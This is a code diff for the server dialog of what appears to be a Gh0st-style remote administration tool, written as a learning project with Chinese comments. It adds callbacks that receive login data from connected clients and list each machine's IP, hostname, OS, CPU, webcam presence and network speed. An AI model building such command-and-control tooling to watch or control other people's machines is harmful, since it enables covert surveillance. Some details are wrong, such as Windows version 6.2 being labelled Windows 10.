@@ -43,6 +43,8 @@ COLUMN_DATA __ServerInfoList[] =
 	{ "Content",	    550 }
 };
 
+CCrabRemoteServerDlg* __ServerProjectDlg = NULL;
+
 
 
 // 用于应用程序“关于”菜单项的 CAboutDlg 对话框
@@ -85,6 +87,8 @@ END_MESSAGE_MAP()
 CCrabRemoteServerDlg::CCrabRemoteServerDlg(CWnd* pParent /*=nullptr*/)
 	: CDialogEx(IDD_CRABREMOTESERVER_DIALOG, pParent)
 {
+	m_listenPort = 0;
+	m_maxConnections = 0;
 	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
 }
 
@@ -121,10 +125,9 @@ BEGIN_MESSAGE_MAP(CCrabRemoteServerDlg, CDialogEx)
 	ON_COMMAND(ID_CLIENT_MANAGER, &CCrabRemoteServerDlg::OnButtonClientManager)
 	ON_COMMAND(ID_SERVER_ABOUT, &CCrabRemoteServerDlg::OnButtonServerAbout)
 	ON_MESSAGE(UM_NOTIFY_ICON_DATA, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnNotifyIconData)
-
-
 	ON_COMMAND(ID_SHOW_MAIN_DIALOG, &CCrabRemoteServerDlg::OnShowMainDialog)
 	ON_COMMAND(ID_HIDE_MAIN_DIALOG, &CCrabRemoteServerDlg::OnHideMainDialog)
+	ON_MESSAGE(UM_CLIENT_LOGIN, OnClientLogin)
 END_MESSAGE_MAP()
 
 
@@ -161,7 +164,7 @@ BOOL CCrabRemoteServerDlg::OnInitDialog()
 
 	// TODO: 在此添加额外的初始化代码
 
-
+	__ServerProjectDlg = this;       //构造函数中也可以
 
 	/*****调用时钟事件*****/
 	SetTimer(0, 1000, NULL);		//1000从现在开始每隔1秒 NULL默认调用OnTimer()函数
@@ -557,7 +560,7 @@ void CCrabRemoteServerDlg::ServerStart()
 	if (m_iocpServer == NULL) {
 		return;
 	}
-	if (m_iocpServer->ServerRun(m_listenPort)) {
+	if (m_iocpServer->ServerRun(m_listenPort, WndCallback)==TRUE) {
 
 	}
 
@@ -566,4 +569,150 @@ void CCrabRemoteServerDlg::ServerStart()
 	v1.Format(_T("监听端口: %d 最大连接数:%d"), m_listenPort, m_maxConnections);
 	ShowMainDlgInfo(TRUE, v1);
 
+}
+
+VOID CCrabRemoteServerDlg::WndCallback(PCONTEXT_OBJECT ContextObject)
+{
+	//IocpSever类中与窗口交互的函数   
+
+//静态成员函数
+//线程回调
+//窗口回调
+
+//不能够直接调用普通的类成员函数 通过传参this窗口类句柄 
+
+	WndHandleIo(ContextObject);   //学习点点
+}
+
+VOID CCrabRemoteServerDlg::WndHandleIo(CONTEXT_OBJECT* ContextObject)
+{
+	if (ContextObject == NULL)
+	{
+		return;
+	}
+
+	switch (ContextObject->m_ReceivedBufferDataDecompressed.GetArray(0)[0])   //[13][]
+	{
+	case CLIENT_LOGIN:   //用户登录请求
+	{
+
+		//调用类窗口中的非静态成员函数
+
+
+		//消息函数  来实现窗口中的函数调用
+		__ServerProjectDlg->PostMessageA(UM_CLIENT_LOGIN,
+			NULL, (LPARAM)ContextObject);   //使用自定义消息
+
+		break;
+	}
+
+
+	}
+}
+
+LRESULT CCrabRemoteServerDlg::OnClientLogin(WPARAM wParam, LPARAM lParam)
+{
+	CString ClientAddress, ClientPosition, HostName, ProcessorName, IsWebCameraExist, WebSpeed, OsName;
+	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;         //注意这里的  ClientContext  正是发送数据时从列表里取出的数据
+	if (ContextObject == NULL)
+	{
+		return -1;
+	}
+	CString	v1;
+	try
+	{
+		int v20 = ContextObject->m_ReceivedBufferDataDecompressed.GetArrayLength();
+		int v21 = sizeof(LOGIN_INFORMAITON);
+		if (ContextObject->m_ReceivedBufferDataDecompressed.GetArrayLength() != sizeof(LOGIN_INFORMAITON))
+		{
+			return -1;
+		}
+
+		LOGIN_INFORMAITON* LoginInfo =
+			(LOGIN_INFORMAITON*)ContextObject->m_ReceivedBufferDataDecompressed.GetArray();
+		sockaddr_in     v2;
+		memset(&v2, 0, sizeof(v2));
+
+		//分析客户端的IP地址
+		int v3 = sizeof(sockaddr_in);
+		getpeername(ContextObject->clientSocket, (SOCKADDR*)&v2, &v3);
+		ClientAddress = inet_ntoa(v2.sin_addr);
+
+		//主机名称
+		HostName = LoginInfo->HostName;
+
+		switch (LoginInfo->OsVersionInfoEx.dwPlatformId)
+		{
+
+		case VER_PLATFORM_WIN32_NT:
+			if (LoginInfo->OsVersionInfoEx.dwMajorVersion <= 4)
+			{
+				OsName = "WindowsNT";
+			}
+
+			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
+			{
+				OsName = "Windows2000";
+			}
+
+			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
+			{
+				OsName = "WindowsXP";
+			}
+
+			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
+			{
+				OsName = "Windows2003";
+			}
+
+			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
+			{
+				OsName = "WindowsVista";
+			}
+			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
+			{
+				OsName = "Windows7";
+			}
+
+			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
+			{
+				OsName = "Windows10";
+			}
+
+		}
+		//CPU
+		ProcessorName = LoginInfo->ProcessorName;
+		//网速
+		WebSpeed.Format("%d", LoginInfo->WebSpeed);
+		IsWebCameraExist = LoginInfo->IsWebCameraExist ? "有" : "无";
+
+
+		//数据分析
+
+		//向控件添加数据
+		AddClientInfo(ClientAddress, ClientPosition,
+			HostName, OsName, ProcessorName,
+			IsWebCameraExist, WebSpeed, ContextObject);    //最后一个参数 不显示 为了Socket
+		//ContextObject 是放在控件中的隐藏项中
+	}
+	catch (...) {}
+
+}
+
+VOID CCrabRemoteServerDlg::AddClientInfo(CString ClientAddress, CString ClientPosition,
+	CString HostName,
+	CString OsName, CString ProcessorNameString, CString IsWebCameraExist,
+	CString WebSpeed, CONTEXT_OBJECT* ContextObject)
+{
+	//默认为0行  这样所有插入的新列都在最上面
+	int i = m_ClientInfoList.InsertItem(m_ClientInfoList.GetItemCount(),
+		ClientAddress);
+	m_ClientInfoList.SetItemText(i, 2, HostName);
+	m_ClientInfoList.SetItemText(i, 3, OsName);
+	m_ClientInfoList.SetItemText(i, 4, ProcessorNameString);
+	m_ClientInfoList.SetItemText(i, 5, IsWebCameraExist);
+	m_ClientInfoList.SetItemText(i, 6, WebSpeed);
+	m_ClientInfoList.SetItemData(i, (ULONG_PTR)ContextObject);  //插入到该排的隐藏区  删除
+
+	//ShowDialogMessage(TRUE, ClientAddress + "主机上线");
 }
